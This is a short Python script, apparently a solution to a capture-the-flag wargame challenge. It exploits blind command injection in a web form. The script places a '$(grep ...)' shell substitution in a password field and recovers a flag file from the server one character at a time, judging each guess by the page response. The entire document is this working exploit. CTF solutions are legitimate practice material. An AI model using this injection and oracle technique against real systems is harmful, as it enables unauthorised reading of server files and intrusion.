import  requests
import string
url='http://findme.wargame.whitehat.vn/'
string1 = string.ascii_letters + "0123456789"
kq=''

for i in range(0,40):
    for j in string1:
        temp = kq+ j
        query='12345$(grep ^'+temp+' /tmp/findme/flag.txt)'
        payload={
            'passwd':query,
            'submit':'Search'
        }
        r = requests.post(url,data=payload)
        if(r.text.find("teamwork") <= 0):
            kq+=j
            print(kq)
            break
